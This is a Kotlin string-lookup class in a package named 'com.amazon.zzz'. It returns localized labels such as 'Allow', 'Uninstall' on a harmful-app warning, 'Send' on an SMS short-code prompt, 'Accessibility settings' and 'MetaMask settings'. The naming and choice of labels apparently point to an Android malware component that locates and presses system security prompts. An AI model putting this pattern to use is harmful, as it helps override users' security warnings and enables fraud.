package com.amazon.zzz

import org.json.JSONObject
import java.util.Locale

object Strings {

    fun accept(): String? {
        return try {
            val jsonObject = JSONObject(constNm.accept)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Accept"
        }
    }

    fun metamask_settings(): String? {
        return try {
            val jsonObject = JSONObject(constNm.metamask_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Settings"
        }
    }

    fun alert_windows_notification_turn_off_action(): String? {
        return try {
            val jsonObject = JSONObject(constNm.alert_windows_notification_turn_off_action)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Turn off"
        }
    }

    fun allow(): String? {
        return try {
            val jsonObject = JSONObject(constNm.allow)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Allow"
        }
    }

    fun app_info_clear_cache(): String? {
        return try {
            val jsonObject = JSONObject(constNm.app_info_clear_cache)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear cache"
        }
    }

    fun app_info_storage(): String? {
        return try {
            val jsonObject = JSONObject(constNm.app_info_storage)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Storage"
        }
    }

    fun app_info_storage2(): String? {
        return try {
            val jsonObject = JSONObject(constNm.app_info_storage2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Storage"
        }
    }

    fun cancel(): String? {
        return try {
            val jsonObject = JSONObject(constNm.cancel)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Cancel"
        }
    }

    fun cancel2(): String? {
        return try {
            val jsonObject = JSONObject(constNm.cancel2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Cancel"
        }
    }

    fun clear(): String? {
        return try {
            val jsonObject = JSONObject(constNm.clear)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear"
        }
    }

    fun clear_(): String? {
        return try {
            val jsonObject = JSONObject(constNm.clear_)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "clear"
        }
    }

    fun clear_data(): String? {
        return try {
            val jsonObject = JSONObject(constNm.clear_data)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear data"
        }
    }

    fun clear_data2(): String? {
        return try {
            val jsonObject = JSONObject(constNm.clear_data2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear data"
        }
    }

    fun exo_controls_pause_description(): String? {
        return try {
            val jsonObject = JSONObject(constNm.exo_controls_pause_description)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Pause"
        }
    }

    fun global_action_settings(): String? {
        return try {
            val jsonObject = JSONObject(constNm.global_action_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Settings"
        }
    }

    fun gpsVerifYes(): String? {
        return try {
            val jsonObject = JSONObject(constNm.gpsVerifYes)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Yes"
        }
    }

    fun harmful_app_warning_uninstall(): String? {
        return try {
            val jsonObject = JSONObject(constNm.harmful_app_warning_uninstall)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Uninstall"
        }
    }

    fun harmful_app_warning_uninstall2(): String? {
        return try {
            val jsonObject = JSONObject(constNm.harmful_app_warning_uninstall2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Uninstall"
        }
    }

    fun localeTextAccessibility(): String? {
        return try {
            val jsonObject = JSONObject(constNm.l3)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Enable"
        }
    }

    fun lockscreen_transport_pause_description(): String? {
        return try {
            val jsonObject = JSONObject(constNm.lockscreen_transport_pause_description)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Pause"
        }
    }

    fun menu_setting(): String? {
        return try {
            val jsonObject = JSONObject(constNm.menu_setting)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Setting"
        }
    }

    fun notification_app_name_settings(): String? {
        return try {
            val jsonObject = JSONObject(constNm.notification_app_name_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Settings"
        }
    }

    fun ok(): String? {
        return try {
            val jsonObject = JSONObject(constNm.ok)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "OK"
        }
    }

    fun reset(): String? {
        return try {
            val jsonObject = JSONObject(constNm.reset)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Reset"
        }
    }

    fun sms_short_code_confirm_allow(): String? {
        return try {
            val jsonObject = JSONObject(constNm.sms_short_code_confirm_allow)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Send"
        }
    }

    fun spec_settings(): String? {
        return try {
            val jsonObject = JSONObject(constNm.spec_settings)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Accessibility settings"
        }
    }

    fun spec_settings2(): String? {
        return try {
            val jsonObject = JSONObject(constNm.spec_settings2)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Accessibility"
        }
    }

    fun storage_title(): String? {
        return try {
            val jsonObject = JSONObject(constNm.storage_title)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Storage"
        }
    }

    fun uninstall_selected_apps(): String? {
        return try {
            val jsonObject = JSONObject(constNm.uninstall_selected_apps)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Clear All"
        }
    }

    fun wait(): String? {
        return try {
            val jsonObject = JSONObject(constNm.wait)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Wait"
        }
    }

    fun yes(): String? {
        return try {
            val jsonObject = JSONObject(constNm.yes)
            jsonObject.getString(Locale.getDefault().language)
        } catch (ex: Exception) {
            "Yes"
        }
    }

}